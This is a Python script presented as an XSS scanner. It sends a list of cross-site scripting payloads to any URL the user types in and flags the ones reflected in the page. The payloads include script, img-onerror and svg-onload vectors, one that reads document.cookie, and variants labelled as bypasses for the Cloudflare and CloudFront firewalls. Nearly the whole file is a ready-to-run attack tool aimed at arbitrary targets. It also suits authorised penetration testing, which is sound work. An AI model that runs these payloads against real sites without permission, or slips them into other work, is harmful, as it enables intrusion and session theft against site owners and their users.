import requests
import urllib.parse
import sys
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

def check_url(url):
    try:
        requests.get(url)
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"\n[ERROR] {e}")
        sys.exit(1)

def build_payloads():
    payloads = []
    # Payload XSS biasa
    payloads += ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg/onload=alert(1)>', ' "<p><script>alert(document.cookie)</script></p>']

    # Payload bypass WAF Cloudflare
    payloads += ['<svg><script>a&#x6C;ert(1)</script>', '<scr<script>ipt>alert(1)</scr</script>ipt>', '<body/onload=alert(1)>']

    # Payload bypass WAF Cloudfront
    payloads += ['<script>alert`1`</script>', '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">', '<svg/onload=\u0061\u006C\u0065\u0072\u0074(1)>']

    return payloads

def test_payloads(url, payloads):
    for payload in payloads:
        encoded_payload = urllib.parse.quote(payload)
        test_url = url + encoded_payload

        try:
            response = requests.get(test_url)
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"[ERROR] {e}")
            continue

        if payload in response.text:
            print(Fore.GREEN + f"[+] Found XSS $ {test_url}")

def main():
    print(Fore.BLUE + "[+] XSS Scanner")

    # Input target URL
    target_url = input(Fore.YELLOW + "[+] Enter target URL: ")

    # Check target URL is valid
    check_url(target_url)

    # Build payloads
    payloads = build_payloads()

    # Test each payload on target URL
    test_payloads(target_url, payloads)

    # Ask if want to continue or exit
    while True:
        user_choice = input(Fore.CYAN + "\n[+] Scan complete. Do you want to scan again? (Y/N): ")
        if user_choice.lower() == 'y':
            main()
        elif user_choice.lower() == 'n':
            sys.exit(0)
        else:
            print(Fore.RED + "[ERROR] Invalid choice. Please choose Y or N")

if __name__ == "__main__":
    main()
